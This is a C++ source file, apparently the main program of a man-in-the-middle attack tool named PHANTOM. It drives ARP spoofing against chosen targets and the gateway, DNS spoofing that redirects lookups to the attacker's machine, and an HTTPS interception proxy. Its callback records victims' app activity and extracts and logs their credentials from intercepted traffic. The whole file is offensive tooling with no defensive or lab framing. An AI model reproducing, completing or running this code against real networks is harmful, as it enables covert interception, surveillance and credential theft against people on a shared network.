#include "logger.h"
#include "types.h"
#include "config.h"
#include "network.h"
#include "arp_spoof.h"
#include "dns_spoof.h"
#include "proxy.h"
#include "device_tracker.h"
#include "dpi_engine.h"
#include <iostream>
#include <sstream>
#include <string>
#include <thread>
#include <csignal>
#include <atomic>

#ifndef _WIN32
#include <poll.h>
#include <unistd.h>
#else
#include <windows.h>
#endif

using namespace phantom;

namespace {

std::atomic<bool> g_shutdown{false};
void HandleSignal(int) { g_shutdown = true; }

void PrintHelp() {
    std::cout <<
        "\nPHANTOM interactive commands:\n"
        "  net.show              show the current device table\n"
        "  net.probe on|off      start/stop continuous LAN host discovery\n"
        "  arp.spoof on [ip]     start ARP spoofing (add a target IP first if none was set with -t)\n"
        "  arp.spoof off         stop ARP spoofing and restore ARP tables\n"
        "  dns.spoof on|off      start/stop DNS spoofing\n"
        "  https.proxy on|off    start/stop the MITM proxy\n"
        "  help                  show this message\n"
        "  quit / exit           stop everything and exit\n"
        << std::endl;
}

// Waits up to timeout_ms for a line on stdin without blocking indefinitely,
// so the shutdown flag keeps getting checked even if nothing is typed.
bool StdinLineReady(int timeout_ms) {
#ifndef _WIN32
    struct pollfd pfd{STDIN_FILENO, POLLIN, 0};
    int rc = poll(&pfd, 1, timeout_ms);
    // POLLHUP alone (no POLLIN) still means "try to read": the pipe's write
    // end can close while bytes we already pulled into cin's buffer are
    // unconsumed, or getline will correctly see real EOF and we handle that.
    return rc > 0 && (pfd.revents & (POLLIN | POLLHUP | POLLERR));
#else
    // Wait on the console input handle so we honor timeout_ms instead of
    // blocking forever in getline() when nothing has been typed — without
    // this, command_thread.join() during shutdown could hang indefinitely.
    HANDLE h = GetStdHandle(STD_INPUT_HANDLE);
    if (h == INVALID_HANDLE_VALUE) return true; // can't check, fall back to blocking read
    DWORD rc = WaitForSingleObject(h, (DWORD)timeout_ms);
    return rc == WAIT_OBJECT_0;
#endif
}

void CommandLoop(ArpSpoofer& arp_spoofer, DnsSpoofer& dns_spoofer, MitmProxy& proxy,
                  DeviceTracker& tracker, const std::string& iface_name,
                  const std::string& gateway_ip_str) {
    PrintHelp();

    while (!g_shutdown) {
        if (!StdinLineReady(200)) continue;

        std::string line;
        if (!std::getline(std::cin, line)) break; // stdin closed/EOF

        std::istringstream iss(line);
        std::string cmd, sub, arg;
        iss >> cmd >> sub >> arg;
        if (cmd.empty()) continue;

        if (cmd == "quit" || cmd == "exit") {
            g_shutdown = true;
            break;
        } else if (cmd == "help") {
            PrintHelp();
        } else if (cmd == "net.show") {
            tracker.PrintTable();
        } else if (cmd == "net.probe") {
            if (sub == "on") {
                if (tracker.IsScanning()) LOG_WARN("net.probe already running");
                else { tracker.StartArpScan(); LOG_SUCCESS("net.probe started"); }
            } else if (sub == "off") {
                if (!tracker.IsScanning()) LOG_WARN("net.probe not running");
                else { tracker.StopArpScan(); LOG_SUCCESS("net.probe stopped"); }
            } else {
                LOG_WARN("usage: net.probe on|off");
            }
        } else if (cmd == "arp.spoof") {
            if (sub == "on") {
                if (!arg.empty()) {
                    if (arp_spoofer.IsRunning()) arp_spoofer.Stop(); // joins before we touch targets_
                    IPv4Address tip = IPv4Address::FromString(arg);
                    MacAddress tmac = NetworkManager::GetMacForIp(iface_name, tip);
                    arp_spoofer.AddTarget(tip, tmac);
                    Session::Instance().UpdateDevice(tmac, [&](DeviceInfo& dev) {
                        dev.ip = tip;
                        dev.mac = tmac;
                        dev.is_target = true;
                    });
                }
                if (gateway_ip_str.empty()) {
                    LOG_ERROR("No gateway resolved, cannot start arp.spoof");
                } else if (arp_spoofer.IsRunning()) {
                    LOG_WARN("arp.spoof already running");
                } else if (arp_spoofer.Start()) {
                    LOG_SUCCESS("arp.spoof started");
                } else {
                    LOG_ERROR("arp.spoof failed to start (add a target: arp.spoof on <ip>)");
                }
            } else if (sub == "off") {
                if (!arp_spoofer.IsRunning()) LOG_WARN("arp.spoof not running");
                else { arp_spoofer.Stop(); LOG_SUCCESS("arp.spoof stopped"); }
            } else {
                LOG_WARN("usage: arp.spoof on [ip] | arp.spoof off");
            }
        } else if (cmd == "dns.spoof") {
            if (sub == "on") {
                if (dns_spoofer.IsRunning()) LOG_WARN("dns.spoof already running");
                else if (dns_spoofer.Start()) LOG_SUCCESS("dns.spoof started");
                else LOG_ERROR("dns.spoof failed to start");
            } else if (sub == "off") {
                if (!dns_spoofer.IsRunning()) LOG_WARN("dns.spoof not running");
                else { dns_spoofer.Stop(); LOG_SUCCESS("dns.spoof stopped"); }
            } else {
                LOG_WARN("usage: dns.spoof on|off");
            }
        } else if (cmd == "https.proxy") {
            if (sub == "on") {
                if (proxy.IsRunning()) LOG_WARN("https.proxy already running");
                else if (proxy.Start()) LOG_SUCCESS("https.proxy started on port " + std::to_string(PROXY_PORT));
                else LOG_ERROR("https.proxy failed to start");
            } else if (sub == "off") {
                if (!proxy.IsRunning()) LOG_WARN("https.proxy not running");
                else { proxy.Stop(); LOG_SUCCESS("https.proxy stopped"); }
            } else {
                LOG_WARN("usage: https.proxy on|off");
            }
        } else {
            LOG_WARN("Unknown command: " + cmd + " (type 'help')");
        }
    }
}

} // namespace

int main(int argc, char** argv) {
    Logger::Instance().Init(LOG_DIR);
    LOG_INFO("PHANTOM booted");

    std::signal(SIGINT, HandleSignal);
    std::signal(SIGTERM, HandleSignal);

    std::string iface_name;
    std::vector<std::string> target_ips;
    bool want_arp = false, want_dns = false, want_proxy = false;
    bool want_dpi = false, want_creds = false, want_scan = false;

    for (int i = 1; i < argc; ++i) {
        std::string arg = argv[i];
        if (arg == "-i" && i + 1 < argc) {
            iface_name = argv[++i];
        } else if ((arg == "-t" || arg == "--target") && i + 1 < argc) {
            target_ips.push_back(argv[++i]);
        } else if (arg == "--arp") {
            want_arp = true;
        } else if (arg == "--dns") {
            want_dns = true;
        } else if (arg == "--proxy") {
            want_proxy = true;
        } else if (arg == "--dpi") {
            want_dpi = true;
        } else if (arg == "--creds") {
            want_creds = true;
        } else if (arg == "--scan") {
            want_scan = true;
        }
    }

    if (iface_name.empty()) {
        LOG_ERROR("No interface specified, pass one with -i <interface> (e.g. -i eth0)");
        return 1;
    }

    auto iface = NetworkManager::FindInterface(iface_name);
    if (!iface) {
        LOG_ERROR("Interface not found: " + iface_name);
        return 1;
    }

    Session& session = Session::Instance();
    session.running = true;
    session.config.interface_name = iface_name;
    session.config.local_ip = IPv4Address::FromString(iface->ip);
    session.config.local_mac = MacAddress::FromString(iface->mac);

    std::string gateway_ip_str = !iface->gateway.empty()
        ? iface->gateway : NetworkManager::GetDefaultGateway();
    if (!gateway_ip_str.empty()) {
        session.config.gateway_ip = IPv4Address::FromString(gateway_ip_str);
        session.config.gateway_mac = NetworkManager::GetMacForIp(iface_name, session.config.gateway_ip);
    }
    for (auto& t : target_ips) {
        session.config.target_ips.push_back(IPv4Address::FromString(t));
    }

    DeviceTracker& tracker = DeviceTracker::Instance();
    if (want_scan) {
        tracker.StartArpScan();
        LOG_SUCCESS("net.probe started");
    }

    ArpSpoofer arp_spoofer;
    arp_spoofer.SetInterface(iface_name);
    if (!gateway_ip_str.empty()) {
        arp_spoofer.SetGateway(session.config.gateway_ip, session.config.gateway_mac);
    }
    for (auto& t : target_ips) {
        IPv4Address tip = IPv4Address::FromString(t);
        MacAddress tmac = NetworkManager::GetMacForIp(iface_name, tip);
        arp_spoofer.AddTarget(tip, tmac);
        Session::Instance().UpdateDevice(tmac, [&](DeviceInfo& dev) {
            dev.ip = tip;
            dev.mac = tmac;
            dev.is_target = true;
        });
    }
    if (want_arp) {
        if (target_ips.empty()) {
            LOG_WARN("--arp requested but no --target <ip> given, skipping ARP spoofing");
        } else if (gateway_ip_str.empty()) {
            LOG_WARN("--arp requested but no gateway could be resolved, skipping ARP spoofing");
        } else if (arp_spoofer.Start()) {
            LOG_SUCCESS("arp.spoof started for " + std::to_string(target_ips.size()) + " target(s)");
        } else {
            LOG_ERROR("Failed to start ARP spoofing");
        }
    }

    DnsSpoofer dns_spoofer;
    dns_spoofer.SetInterface(iface_name);
    dns_spoofer.SetRedirectIp(iface->ip);
    if (want_dns) {
        if (dns_spoofer.Start()) {
            LOG_SUCCESS("dns.spoof started (redirecting resolved names to " + iface->ip + ")");
        } else {
            LOG_ERROR("Failed to start DNS spoofing");
        }
    }

    MitmProxy proxy;
    if (want_dpi || want_creds) {
        proxy.SetDpiCallback([want_dpi, want_creds](HttpTransaction& txn, const std::string& client_ip) {
            MacAddress mac = MacAddress::FromString(
                NetworkManager::ArpLookup(IPv4Address::FromString(client_ip)));

            if (want_dpi) {
                ParsedActivity activity = DpiEngine::Instance().AnalyzeTransaction(txn);
                if (activity.app != AppType::UNKNOWN) {
                    Session::Instance().AddActivity(activity);
                    DeviceTracker::Instance().RecordActivity(activity, mac);
                    LOG_ACTIVITY(activity.app_label + " | " + activity.activity_label +
                                 " | " + client_ip);
                }
            }

            if (want_creds) {
                for (auto& cred : DpiEngine::Instance().ExtractCredentials(txn)) {
                    Session::Instance().AddCredential(cred);
                    DeviceTracker::Instance().RecordCredential(cred, mac);
                    LOG_CREDENTIAL(cred.service + " | " + cred.credential_type +
                                   " | " + client_ip);
                }
            }
        });
    }
    if (want_proxy) {
        if (proxy.Start()) {
            LOG_SUCCESS("https.proxy started on port " + std::to_string(PROXY_PORT));
        } else {
            LOG_ERROR("Failed to start MITM proxy");
        }
    }

    LOG_SUCCESS("PHANTOM ready");

    std::thread command_thread(CommandLoop, std::ref(arp_spoofer), std::ref(dns_spoofer),
                                std::ref(proxy), std::ref(tracker), std::cref(iface_name),
                                std::cref(gateway_ip_str));

    while (session.running && !g_shutdown) {
        std::this_thread::sleep_for(std::chrono::milliseconds(200));
    }

    LOG_INFO("Shutting down...");
    session.running = false;
    g_shutdown = true;
    if (command_thread.joinable()) command_thread.join();

    if (tracker.IsScanning() || want_scan) {
        tracker.StopArpScan();
        tracker.PrintTable();
    }
    if (proxy.IsRunning()) proxy.Stop();
    if (dns_spoofer.IsRunning()) dns_spoofer.Stop();
    if (arp_spoofer.IsRunning()) arp_spoofer.Stop();

    LOG_SUCCESS("PHANTOM stopped cleanly");
    return 0;
}
